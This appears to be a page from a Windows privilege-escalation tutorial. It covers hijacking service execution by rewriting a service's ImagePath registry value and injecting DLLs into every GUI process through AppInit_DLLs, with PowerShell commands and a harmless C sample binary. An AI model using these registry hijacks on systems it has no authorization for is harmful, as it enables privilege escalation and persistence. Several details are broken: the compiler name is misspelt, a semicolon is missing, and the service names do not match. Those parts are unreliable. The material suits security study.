## DLL Hijacking with Registry

### HKLM\SYSTEM\CurrentControlSet\Services\

Services are a common target for privilege escalation that was already discussed in the series:
- Windows Services
- Weak Service Permissions
- Unquoted Service Path

Specifically, by having write access to the registry path
```powershell
HKLM\SYSTEM\CurrentControlSet\Services\
```

It is possible to change the `imagePath` attribute of arbitrary services. This attribute is used to determine the executable to start when the service is started.

To modify the service `test`
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\test.exe"
```

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
```

By modifying the binary with a malicious binary, it is possible to hijack execution. Remember to restart the service.
```powershell
Restart-Service -Name test
```

File `test.exe`
```c
// Cross-Compile with
// z86_64-w64ming32-g++ test.c -static -o test

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
	char filepath[512] = "C:/Users/Quickemu/Downloads/test.txt"

	FILE *file = fopen(filepath, "w");
	if (file == NULL) { return 1; }
	fprintf(file, "Hello world\n");
	fclose(file);
	
	return 0;
}
```

### HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

The `AppInit_DLLs` registry key specifies a list of DLLs that Windows will load into every user-mode application that uses the Microsoft Windows graphical user interface (GUI), specifically those that use the Windows subsystem for applications (Win32).

Since any DLL listed in `AppInit_DLLs` will be loaded by every GUI-based process, this registry key has historically been a target for malicious software. Malware may attempt to use this key to inject its own malicious DLLs into system processes or applications.

As a result, modern versions of Windows have additional protections to restrict or limit the use of AppInit_DLLs, such as blocking the use of the key unless a specific setting is configured to allow it.

Dealing with `LoadAppInit_DLLs`
1. Enable
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 1
```

2. Disable
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 0
```

3. Read
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs"
```

Dealing with `AppInit_DLLs`
1. Read
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"
```

2. Set
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\Path\To\Library1.dll;C:\Path\To\Library2.dll;C:\Path\To\Library3.dll"
```
